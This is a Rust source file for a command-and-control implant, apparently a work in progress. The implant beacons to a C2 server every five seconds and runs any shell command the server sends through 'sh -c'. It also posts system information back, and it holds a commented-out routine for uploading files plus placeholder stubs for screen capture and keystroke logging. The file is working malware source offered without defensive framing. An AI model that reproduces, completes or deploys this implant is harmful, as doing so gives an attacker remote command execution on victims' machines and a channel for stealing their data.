extern crate Justice;
use reqwest::Error;
use serde_json;
use Justice::CheckInResponse;
use std::time::SystemTime;
use Justice::actions::ResponseActionType;
use Justice::actions::c2_actions;
use Justice::PostRequest;
use Justice::actions::RequestActionType;
use std::process::Command;

const C2URL: &str = "http://localhost:8000";
const C2ID: &str = "12345678";
async fn register_implant() -> Result<(), Error> {
    let url: String = format!("{}/c2/{}", C2URL, C2ID);
    let response = reqwest::get(url).await?;
    match response.status() {
        reqwest::StatusCode::OK => {
            println!("Successfully registered implant");
            let body = response.text().await?;
            handle_body(body).await;
        }
        _ => {
            println!("error: {}", response.text().await?);
        }
    }
    Ok(())
}

async fn handle_body(body: String) {
    let c2_response = serde_json::from_str::<CheckInResponse>(&body);
    match c2_response {
        Ok(c2_response) => {
            match c2_response.task { 
                c2_actions::Wait => {
                    {}
                }
                c2_actions::ShellCommand => {
                    exec_shell_command(c2_response.task_parameters).await;
                    println!("Successfully registered implant");
                }
                c2_actions::SystemInfo => {
                    send_sys_info().await;
                }
                _ => {
                    println!("Unknown action type");
                }
                
            }
        }
        Err(_) => {
            println!("Error parsing response");
        }
    }
}

async fn send_sys_info() {
    let client = reqwest::Client::new();
    let body = serde_json::to_string(&PostRequest::new(
        SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).unwrap().as_secs(),
        c2_actions::SystemInfo,
        "".to_string(),
        "Not yet implemented".as_bytes().to_vec()
    )).unwrap();
    client.post(format!("{}/{}", C2URL, C2ID).as_str())
        .body(body)
        .send().await.unwrap();
    println!("Sending system info");
}
async fn send_file(target_file: String) {
    println!("TODO");
    /* 
    let client = reqwest::Client::new();
    let file = std::fs::read(&target_file);
    match file {
        Ok(file) => {
            println!("Sending file");
            client.put(format!("{}/c2/{}/{}", C2URL, C2ID, target_file).as_str())
                .body(file)
                .send()
                .await;
        }
        Err(_) => {
            let body = serde_json::to_string(&C2Request::new(
                RequestHeaders::new(
                    C2ID.to_string(),
                    SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).unwrap().as_secs(),
                    RequestActionType::FileUpload
                ),
                "Error reading file".to_string()
            )).unwrap();
            
            client.post(format!("{}/{}", C2URL, C2ID).as_str())
                .body(body)
                .send().await.unwrap();
        }
    }
    println!("Sending file");
    */
}
async fn send_screen_capture() {
    println!("Sending screen capture");
}
async fn send_key_strokes() {
    println!("Sending keystrokes");
}
async fn exec_shell_command(params: String) {
    let output = Command::new("sh")
        .arg("-c")
        .arg(params)
        .output()
        .expect("Failed to execute command");

    if output.status.success() {
        println!("Command executed successfully: {}", String::from_utf8_lossy(&output.stdout));
    } else {
        println!("Command execution failed: {}", String::from_utf8_lossy(&output.stderr));
    }
}

#[tokio::main]
async fn main() -> Result<(), Error> {
    loop {
        register_implant().await?;
        tokio::time::sleep(std::time::Duration::from_secs(5)).await;
    };
    println!("Hello, world!");
    Ok(())
}
